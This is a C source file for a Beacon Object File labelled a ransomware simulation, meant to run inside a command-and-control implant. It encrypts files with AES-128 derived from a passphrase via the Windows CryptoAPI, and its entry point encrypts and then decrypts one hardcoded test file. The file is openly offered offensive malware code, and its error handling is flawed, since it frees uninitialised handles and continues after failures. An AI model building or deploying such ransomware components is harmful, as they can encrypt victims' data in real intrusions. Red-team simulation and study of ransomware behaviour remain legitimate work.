/*

 * Credits:
   - @cocomelonc : MalDev for Ethical Hackers Ch. 16
   - John Hammond BOF Tutorial
   - Sektor7's COFF modules
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include ".\impact\ransomware-sim-bof-imports.h"
#include ".\impact\ransomware-sim-bof-structs.h"
#include "..\beacon.h"
#include "..\bofdefs.h"

#define AES_BLOCK_SIZE 16
#define IN_CHUNK_SIZE (AES_BLOCK_SIZE * 10)
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2)


// Function Defn: Encrypts the input file and produce an encrypted outfile
void encryptFile(const char* inputFile, const char* outputFile, const char* aesKey) {
	HCRYPTPROV hCryptProv;
	HCRYPTKEY hKey;
	HANDLE hInputFile = INVALID_HANDLE_VALUE;
	HANDLE hOutputFile = INVALID_HANDLE_VALUE;

	// Open input file for reading
	hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
		return;

	// Check file size
	LARGE_INTEGER fileSize;
	if (!GetFileSizeEx(hInputFile, &fileSize)) {
		CloseHandle(hInputFile);
		return;
	}

	// Encrypt only if file size is less than 128MB
	if (fileSize.QuadPart > 128 * 1024 * 1024) {
		CloseHandle(hInputFile);
		return;
	}

	// Create output file for writing - output encrypted file
	hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE) {
		CloseHandle(hInputFile);
		return;
	}

	// Cryptographic service provider - choose which encryption provider to use
	if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
	}
	
	// Acquire a hash object handle. 2nd param includes the kind of hash/encryption to use
	// This creates a hashed container in memory.
	HCRYPTHASH hHash;
	if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
	}
	
	// Handle is used in subsequent calls to CryptHashData and CryptHashSessionKey to hash any stream of data.
	// Adds data to a specified hash object. This function and CryptHashSessionKey can be called multiple times to compute the hash of long or discontinuous data streams. 
	// The hashed container from previous WinAPI call grows with the amount of data ingested from this stream
	if (!CryptHashData(hHash, (BYTE*)aesKey, MSVCRT$strlen(aesKey), 0)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
	}

	// Generates cryptographic session keys derived from a base data value. This function guarantees that when the same cryptographic 
	// service provider (CSP) and algorithms are used, the keys generated from the same base data are identical. 
	// The base data can be a password or any other user data - in this case, its the handle to a hash object that has been fed the exact base data.
	if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
	}

	const size_t chunk_size = OUT_CHUNK_SIZE;
	BYTE* chunk = (BYTE*) MSVCRT$malloc(chunk_size);
	DWORD out_len = 0;

	BOOL isFinal = FALSE; // presumes there are more blocks to be encrypted
	DWORD readTotalSize = 0;
	BOOL bResult = FALSE;

	// Reads each byte of the input file to be stored on the buffer 'chunk'
	while (bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize >= fileSize.QuadPart) {
			isFinal = TRUE;
		}

		//  Encrypts each line of data(per 'ReadFile' execution). The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter.
		// 5th param: A pointer to a buffer that contains the plaintext to be encrypted. The plaintext in this buffer is overwritten with the ciphertext created by this function.
		if (!CryptEncrypt(hKey, (HCRYPTHASH)NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
			break;
		}

		DWORD written = 0;
		// Write the encrypted file
		if (!WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
			break;
		}

		MSVCRT$memset(chunk, 0, chunk_size);
	}

	if (hKey) {
		CryptDestroyKey(hKey);
	}
	if (hCryptProv) {
		CryptReleaseContext(hCryptProv, 0);
	}
	if (hInputFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hInputFile);
	}
	if (hOutputFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hOutputFile);
	}

	MSVCRT$free(chunk);
}


// Decrypts the file
void decryptFile(const char* inputFile, const char* outputFile, const BYTE* aesKey) {
	HCRYPTPROV hCryptProv;
	HCRYPTKEY hKey;
	HANDLE hInputFile = INVALID_HANDLE_VALUE;
	HANDLE hOutputFile = INVALID_HANDLE_VALUE;

	DWORD len = MSVCRT$strlen((const char*)aesKey);
	DWORD key_size = len * sizeof(aesKey[0]);

	// Open input file for reading
	hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE) {
		return;
	}

	// Create output file for writing
	hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE) {
		return;
	}

	// Cryptographic service provider
	if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
	}

	HCRYPTHASH hHash;
	if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
	}

	BYTE utf8ByteArray[32];
	MSVCRT$strcpy((char*)utf8ByteArray, (const char*)aesKey);

	if (!CryptHashData(hHash, utf8ByteArray, key_size, 0)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
		return;
	}

	// HCRYPTKEY hKey;
	if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
		CryptDestroyKey(hKey);
		CryptReleaseContext(hCryptProv, 0);
		return;
	}

	const size_t chunk_size = IN_CHUNK_SIZE;
	BYTE* chunk = (BYTE*) MSVCRT$malloc(chunk_size);
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	BOOL bResult = FALSE;

	DWORD inputSize = GetFileSize(hInputFile, NULL);

	while (bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize >= inputSize) {
			isFinal = TRUE;
		}

		if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, isFinal, 0, chunk, &out_len)) {
			CryptDestroyKey(hKey);
			CryptReleaseContext(hCryptProv, 0);
			break;
		}
		DWORD written = 0;
		if (!WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
			CloseHandle(hOutputFile);
			break;
		}
		MSVCRT$memset(chunk, 0, chunk_size);
	}

	if (hKey) {
		CryptDestroyKey(hKey);
	}
	if (hCryptProv) {
		CryptReleaseContext(hCryptProv, 0);
	}
	if (hInputFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hInputFile);
	}
	if (hOutputFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hOutputFile);
	}

	MSVCRT$free(chunk);
}



void go(char *args, int alen) {
	// test private key (replace with your actual private key)
	const char* aesKey = "testingImpacBOF";

	// test files (replace with the path to your test file)
	const char* inputFile = "C:\\Users\\Test\\Documents\\BOF\\impact\\test.txt";
	const char* encryptedFile = "C:\\Users\\Test\\Documents\\BOF\\impact\\test.txt.AES";
	const char* decryptedFile = "C:\\Users\\Test\\Documents\\BOF\\impact\\test.txt.decrypted";

	// encrypt the file
	encryptFile(inputFile, encryptedFile, aesKey);

	// decrypt the file
	decryptFile(encryptedFile, decryptedFile, (const BYTE*)aesKey);

	return;
}